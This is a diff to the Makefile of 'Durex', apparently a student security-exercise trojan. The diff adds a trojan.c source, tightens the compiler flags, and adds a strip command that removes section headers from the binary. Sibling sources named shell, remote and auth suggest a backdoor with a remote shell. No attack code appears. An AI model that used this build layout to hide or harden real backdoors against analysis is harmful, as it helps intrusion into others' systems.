@@ -6,7 +6,7 @@
 #    By: alagroy- <alagroy-@student.42.fr>          +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2021/04/23 13:46:17 by alagroy-          #+#    #+#              #
-#    Updated: 2021/12/02 10:43:38 by alagroy-         ###   ########.fr        #
+#    Updated: 2021/12/06 10:48:39 by alagroy-         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -14,7 +14,7 @@ NAME = Durex
 
 CC = gcc
 NASM = /usr/bin/nasm
-CFLAGS = -g #-Wall -Werror -Wextra -g #-fsanitize=address
+CFLAGS = -Wall -Werror -Wextra #-g -fsanitize=address
 CFLAGS += $(addprefix -I , $(INCLUDES))
 
 INCLUDES_DIR = ./includes/
@@ -22,7 +22,7 @@ SRCS_DIR = ./srcs/
 INCLUDES = $(INCLUDES_DIR)
 OBJS_DIR = ./.objs/
 
-SRC_FILES = main.c decryption.c encryption.c payload.c
+SRC_FILES = main.c decryption.c encryption.c payload.c trojan.c
 OBJ_FILES = $(SRC_FILES:.c=.o)
 OBJS = $(addprefix $(OBJS_DIR), $(OBJ_FILES))
 SRC_SERVICE = service.s server.s auth.s shell.s remote.s
@@ -35,6 +35,7 @@ all: $(OBJS_DIR) $(NAME)
 
 $(NAME): $(SRCS_DIR)/payload.c make_objs $(OBJS)
 	$(CC) $(CFLAGS) -o $@ $(OBJS)
+	strip -s --remove-section=".comment,.shstrtab" Durex -o Durex
 	printf "\n\033[0;32m[$(NAME)] Linking [OK]\n\033[0;0m"
 
 service: $(OBJS_SERVICE) Makefile
